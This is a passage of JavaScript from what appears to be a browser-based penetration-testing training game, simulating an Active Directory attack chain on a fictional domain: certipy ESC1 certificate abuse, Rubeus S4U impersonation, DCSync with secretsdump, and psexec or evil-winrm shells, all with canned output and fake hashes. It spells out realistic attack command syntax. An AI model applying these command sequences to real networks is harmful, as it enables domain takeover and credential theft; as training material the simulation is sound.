    // REQ - Request certificate
    if (action === 'req') {
      if (!state.foundVulnTemplate) {
        print('[!] Enumerate templates first: certipy find', 'warning');
        return;
      }

      if (fullCmd.includes('-upn') && fullCmd.includes('Administrator')) {
        await simulateLoading('Requesting certificate as Administrator', 3000);
        print('');
        print('[*] Certipy v4.7.0 - Certificate Request', 'system');
        print('[*] Requesting certificate for Administrator@blackpeak.local', 'warning');
        print('[*] Template: WebServer (ESC1 Vulnerable)', 'warning');
        print('');
        print('[+] Certificate request successful!', 'success');
        print('[+] Certificate saved as: administrator.pfx', 'success');
        print('[+] Private key saved in PFX', 'success');
        print('');
        print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'success');
        print('â•‘  CERTIFICATE OBTAINED                                           â•‘', 'success');
        print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'success');
        print('â•‘  Subject:     CN=web_svc                                        â•‘', 'system');
        print('â•‘  SAN (UPN):   Administrator@blackpeak.local                     â•‘', 'error');
        print('â•‘  Issuer:      BLACKPEAK-CA                                      â•‘', 'system');
        print('â•‘  Valid:       1 year                                            â•‘', 'system');
        print('â•‘  EKU:         Client Authentication                             â•‘', 'warning');
        print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
        print('');
        print('[*] Use this cert to authenticate as Administrator:', 'info');
        print('[*] certipy auth -pfx administrator.pfx', 'success');

        state.gotAdminCert = true;
        state.certificates.push({
          name: 'administrator.pfx',
          upn: 'Administrator@blackpeak.local',
          template: 'WebServer'
        });
        playSuccess();
        autosave();
        return;
      }

      print('Usage: certipy req -u <user> -ca <ca-name> -template <template> -upn <target-upn>', 'error');
      return;
    }

    // AUTH - Authenticate with certificate
    if (action === 'auth') {
      if (!state.gotAdminCert) {
        print('[!] Request a certificate first with certipy req', 'warning');
        return;
      }

      if (fullCmd.includes('administrator.pfx')) {
        await simulateLoading('Authenticating with certificate (PKINIT)', 3000);
        print('');
        print('[*] Certipy v4.7.0 - Certificate Authentication', 'system');
        print('[*] Using certificate: administrator.pfx', 'system');
        print('[*] Performing PKINIT authentication...', 'system');
        print('');
        print('[+] Got TGT for Administrator@BLACKPEAK.LOCAL', 'success');
        print('[+] Recovered NT hash from PAC:', 'success');
        print('');
        print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'success');
        print('â•‘  ADMINISTRATOR CREDENTIALS RECOVERED                            â•‘', 'success');
        print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'success');
        print('â•‘  Username:  Administrator                                       â•‘', 'error');
        print('â•‘  Domain:    BLACKPEAK.LOCAL                                     â•‘', 'system');
        print('â•‘  NT Hash:   2b576acbe6bcfda7294d6bd18041b8fe                    â•‘', 'error');
        print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
        print('');
        print('[!] DOMAIN ADMIN HASH OBTAINED!', 'success');
        print('[*] Use with: impacket-psexec or evil-winrm -H <hash>', 'info');

        state.extractedNTHash = true;
        state.ntHashes['Administrator'] = '2b576acbe6bcfda7294d6bd18041b8fe';
        playSuccess();
        autosave();
        return;
      }

      print('Usage: certipy auth -pfx <certificate.pfx>', 'error');
      return;
    }

    print('Usage: certipy <find|req|auth> [options]', 'error');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // RUBEUS - KERBEROS ATTACKS (S4U)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'rubeus') {
    const action = args[0];

    // ASKTGT - Request TGT
    if (action === 'asktgt') {
      if (!state.foundConstrainedDeleg) {
        print('[!] Enumerate constrained delegation first with bloodhound', 'warning');
        return;
      }

      if (fullCmd.includes('web_svc')) {
        await simulateLoading('Requesting TGT for web_svc', 2000);
        print('');
        print('   ______        _', 'warning');
        print('  (_____ \\      | |', 'warning');
        print('   _____) )_   _| |__   ____  _   _  ___', 'warning');
        print('  |  __  /| | | |  _ \\ / _  )| | | |/___)  ', 'warning');
        print('  | |  \\ \\| |_| | |_) | (/ / | |_| |___ |', 'warning');
        print('  |_|   |_|____/|____/ \\____)|____/(___/', 'warning');
        print('');
        print('[*] Action: Ask TGT', 'system');
        print('[*] Using rc4_hmac hash: a87f3a4d4a9c32dee5f5c...(redacted)', 'system');
        print('[+] TGT request successful!', 'success');
        print('[+] base64(ticket.kirbi):', 'system');
        print('');
        print('    doIFqDCCBaSgAwIBBaEDAgEWoo...', 'success');
        print('    [SNIPPED - Use "tickets" to see full list]', 'system');
        print('');

        state.requestedTGT = true;
        state.tickets.push({
          type: 'TGT',
          user: 'web_svc',
          service: 'krbtgt/BLACKPEAK.LOCAL',
          ticket: 'doIFqDCCBaSgAwIBBaED...'
        });
        autosave();
        return;
      }

      print('Usage: rubeus asktgt /user:<user> /rc4:<hash>', 'error');
      return;
    }

    // S4U - S4U2Self + S4U2Proxy attack
    if (action === 's4u') {
      if (!state.requestedTGT) {
        print('[!] Get a TGT first: rubeus asktgt /user:web_svc /rc4:<hash>', 'warning');
        return;
      }

      if (fullCmd.includes('impersonateuser') && fullCmd.includes('Administrator')) {
        await simulateLoading('Performing S4U2Self + S4U2Proxy', 3000);
        print('');
        print('[*] Action: S4U', 'system');
        print('[*] Building S4U2Self request for: Administrator@BLACKPEAK.LOCAL', 'system');
        print('[*] Sending S4U2Self request...', 'system');
        print('[+] S4U2Self success!', 'success');
        print('[*] Building S4U2Proxy request for: cifs/dc01.blackpeak.local', 'system');
        print('[*] Sending S4U2Proxy request...', 'system');
        print('[+] S4U2Proxy success!', 'success');
        print('');
        print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'success');
        print('â•‘  S4U ATTACK SUCCESSFUL                                            â•‘', 'success');
        print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'success');
        print('â•‘  Impersonated: Administrator@BLACKPEAK.LOCAL                      â•‘', 'error');
        print('â•‘  Service:      cifs/dc01.blackpeak.local                          â•‘', 'warning');
        print('â•‘  Ticket Type:  TGS (Service Ticket)                               â•‘', 'system');
        print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
        print('');
        print('[+] Service ticket saved!', 'success');
        print('[*] Import with: export KRB5CCNAME=admin_cifs.ccache', 'info');
        print('[*] Then use: impacket-psexec dc01.blackpeak.local -k -no-pass', 'success');

        state.performedS4U = true;
        state.gotServiceTicket = true;
        state.tickets.push({
          type: 'TGS',
          user: 'Administrator (impersonated)',
          service: 'cifs/dc01.blackpeak.local',
          ticket: 'doIGHDCCBhigAwIBBaEDAgEW...'
        });
        playSuccess();
        autosave();
        return;
      }

      print('Usage: rubeus s4u /ticket:<base64-tgt> /impersonateuser:<user> /msdsspn:<service/host>', 'error');
      return;
    }

    if (action === 'describe') {
      if (state.tickets.length === 0) {
        print('[!] No tickets obtained yet', 'warning');
        return;
      }

      print('');
      print('Ticket Details:', 'info');
      state.tickets.forEach((t, i) => {
        print(`  [${i}] ${t.type} - ${t.user} â†’ ${t.service}`, 'system');
      });
      print('');
      return;
    }

    print('Usage: rubeus <asktgt|s4u|describe> [options]', 'error');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // TICKETS / CERTS COMMANDS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'tickets') {
    if (state.tickets.length === 0) {
      print('[*] No Kerberos tickets obtained yet', 'system');
      return;
    }

    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘                   KERBEROS TICKETS                            â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    state.tickets.forEach((t, i) => {
      print(`â•‘  [${i}] ${t.type.padEnd(4)} â”‚ ${t.user.padEnd(25)} â”‚ ${t.service.padEnd(20)} â•‘`, t.type === 'TGS' ? 'success' : 'system');
    });
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    return;
  }

  if (cmd === 'certs') {
    if (state.certificates.length === 0) {
      print('[*] No certificates obtained yet', 'system');
      return;
    }

    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘                   CERTIFICATES                                â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    state.certificates.forEach((c, i) => {
      print(`â•‘  [${i}] ${c.name.padEnd(20)} â”‚ UPN: ${c.upn.padEnd(30)} â•‘`, 'success');
    });
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // IMPACKET-SECRETSDUMP - DCSync
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'impacket-secretsdump' || cmd === 'secretsdump') {
    if (!state.extractedNTHash && !state.gotServiceTicket) {
      print('[!] Need DA credentials first (via ADCS or S4U attack)', 'error');
      return;
    }

    if (fullCmd.includes('10.10.50.10') || fullCmd.includes('dc01')) {
      await simulateLoading('Performing DCSync attack', 4000);
      print('');
      print('Impacket v0.10.0 - secretsdump.py', 'system');
      print('[*] Target: dc01.blackpeak.local', 'system');
      print('[*] Dumping Domain Credentials (DCSync)...', 'warning');
      print('');
      print('[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)', 'system');
      print('Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::', 'system');
      print('Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'system');
      print('');
      print('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', 'system');
      print('Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::', 'success');
      print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c6e1d5f8b7a2c3d4e5f6a7b8c9d0e1f:::', 'error');
      print('backup_admin:1103:aad3b435b51404eeaad3b435b51404ee:88a4c0a5d8f4e2b1c3d5a6f7e8b9c0d1:::', 'warning');
      print('web_svc:1104:aad3b435b51404eeaad3b435b51404ee:a87f3a4d4a9c32dee5f5c6b7a8d9e0f1:::', 'system');
      print('sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0:::', 'system');
      print('');
      print('[*] Kerberos keys extracted:', 'system');
      print('krbtgt:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6...', 'error');
      print('krbtgt:aes128-cts-hmac-sha1-96:f1e2d3c4b5a6...', 'system');
      print('');
      print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'error');
      print('â•‘                    DCSYNC COMPLETE                                      â•‘', 'error');
      print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
      print('â•‘  [!] krbtgt hash obtained - GOLDEN TICKET POSSIBLE                      â•‘', 'error');
      print('â•‘  [!] All domain user hashes extracted                                   â•‘', 'warning');
      print('â•‘  [!] DOMAIN FULLY COMPROMISED                                           â•‘', 'success');
      print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'error');
      print('');

      state.dcsyncPerformed = true;
      state.krakenHash = '7c6e1d5f8b7a2c3d4e5f6a7b8c9d0e1f';
      state.ntHashes['krbtgt'] = state.krakenHash;
      addEasterEgg('lvl3_krbtgt', 'The golden key to the kingdom...');
      playSuccess();
      autosave();
      return;
    }

    print('Usage: impacket-secretsdump <domain>/<user>@<dc-ip> -hashes :<nthash>', 'error');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // IMPACKET-PSEXEC / EVIL-WINRM - SHELL ACCESS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'impacket-psexec' || cmd === 'psexec') {
    if (!state.extractedNTHash && !state.gotServiceTicket) {
      print('[!] Need DA credentials first', 'error');
      return;
    }

    if ((fullCmd.includes('10.10.50.10') || fullCmd.includes('dc01')) &&
        (fullCmd.includes('Administrator') || fullCmd.includes('-k'))) {
      await simulateLoading('Connecting via PsExec', 2000);
      print('');
      print('Impacket v0.10.0 - PsExec', 'system');
      print('[*] Requesting shares on 10.10.50.10...', 'system');
      print('[*] Found writable share ADMIN$', 'system');
      print('[*] Uploading file...', 'system');
      print('[*] Opening SVCManager on 10.10.50.10...', 'system');
      print('[*] Creating service on 10.10.50.10...', 'system');
      print('[*] Starting service on 10.10.50.10...', 'system');
      print('[!] Press help for extra shell commands', 'system');
      print('');
      print('Microsoft Windows [Version 10.0.20348.1]', 'system');
      print('(c) Microsoft Corporation. All rights reserved.', 'system');
      print('');
      print('C:\\Windows\\system32>', 'success');

      state.currentHost = 'DC01';
      state.currentUser = 'Administrator';
      setPrompt('Administrator', 'DC01', 'C:\\Windows\\system32');
      playSuccess();
      autosave();
      return;
    }

    print('Usage: impacket-psexec <domain>/<user>@<target> -hashes :<nthash>', 'error');
    return;
  }

  if (cmd === 'evil-winrm') {
    if (!state.extractedNTHash && !state.gotServiceTicket) {
      print('[!] Need DA credentials first', 'error');
      return;
    }

    const hasHash = fullCmd.includes('-H') && fullCmd.includes('2b576acbe6bcfda7294d6bd18041b8fe');
    const hasTarget = fullCmd.includes('10.10.50.10');

    if (hasTarget && hasHash) {
      await simulateLoading('Connecting via WinRM', 2000);
      print('');
      print('Evil-WinRM shell v3.5', 'success');
      print('[*] Connecting to 10.10.50.10 with hash...', 'system');
      print('');
      print('*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>', 'success');

      state.currentHost = 'DC01';
      state.currentUser = 'Administrator';
      setPrompt('Administrator', 'DC01', 'C:\\Users\\Administrator');
      playSuccess();
      autosave();
      return;
    }

    print('Usage: evil-winrm -i <ip> -u <user> -H <nthash>', 'error');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // SHELL COMMANDS ON DC
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'whoami') {
    if (state.currentHost === 'DC01') {
      print('blackpeak\\administrator', 'success');
      if (!state.gotDomainAdmin) {
        state.gotDomainAdmin = true;
        print('');
        completeLevel();
      }
      return;
    }
    print('blackpeak\\web_svc', 'system');
    return;
  }

  if (cmd === 'hostname') {
    print(state.currentHost, 'system');
    return;
  }

  if (cmd === 'net' && args[0] === 'user' && args[1] === '/domain') {
    print('User accounts for \\\\DC01.BLACKPEAK.LOCAL', 'system');
    print('', 'system');
    print('----------------------------------------------------', 'system');
    print('Administrator         backup_admin          Guest', 'system');
    print('krbtgt               sql_svc               web_svc', 'system');
    print('', 'system');
    print('The command completed successfully.', 'system');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // LDAPSEARCH
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'ldapsearch') {
    if (fullCmd.includes('delegation')) {
      print('# searching for constrained delegation', 'system');
      print('dn: CN=web_svc,CN=Users,DC=blackpeak,DC=local', 'system');
      print('sAMAccountName: web_svc', 'system');
      print('msDS-AllowedToDelegateTo: cifs/dc01.blackpeak.local', 'success');
      print('userAccountControl: 16781312 (TRUSTED_TO_AUTH_FOR_DELEGATION)', 'warning');
      print('', 'system');
      state.foundConstrainedDeleg = true;
      return;
    }

    print('# LDAP search results', 'system');
    print('dn: DC=blackpeak,DC=local', 'system');
    print('objectClass: domain', 'system');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // PYWHISKER - SHADOW CREDENTIALS (Easter egg path)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'pywhisker') {
    if (!state.enumDomain) {
      print('[!] Enumerate domain first', 'warning');
      return;
    }

    if (fullCmd.includes('--action') && fullCmd.includes('add')) {
      await simulateLoading('Adding shadow credential', 2000);
      print('');
      print('[*] pywhisker v0.1 - Shadow Credentials Attack', 'system');
      print('[*] Target: Administrator', 'warning');
      print('[*] Adding msDS-KeyCredentialLink attribute...', 'system');
      print('');
      print('[!] ERROR: Insufficient permissions', 'error');
      print('[!] Need GenericWrite/GenericAll on target object', 'error');
      print('');
      print('[*] HINT: web_svc doesn\'t have write access to Administrator', 'info');
      print('[*] Try the ADCS or S4U attack paths instead', 'info');

      addEasterEgg('lvl3_whisker', 'Shadow creds require write access - not all paths work!');
      return;
    }

    print('Usage: pywhisker -d <domain> -u <user> -p <pass> --target <user> --action add', 'error');
    return;
  }

  print(`Command not found: ${cmd}`, 'error');
}

function calculateLevel3Progress(state) {
  let progress = 0;

  // Recon (20%)
  if (state.enumDomain) progress += 5;
  if (state.foundCA) progress += 5;
  if (state.enumTemplates) progress += 5;
  if (state.foundConstrainedDeleg) progress += 5;

  // ADCS Path (30%)
  if (state.foundVulnTemplate) progress += 10;
  if (state.gotAdminCert) progress += 10;
  if (state.extractedNTHash) progress += 10;

  // S4U Path (20%)
  if (state.requestedTGT) progress += 5;
  if (state.performedS4U) progress += 10;
  if (state.gotServiceTicket) progress += 5;

  // Final (30%)
  if (state.dcsyncPerformed) progress += 15;
  if (state.gotDomainAdmin) progress += 15;

  // Cap at 100
  return Math.min(progress, 100);
}
</script>
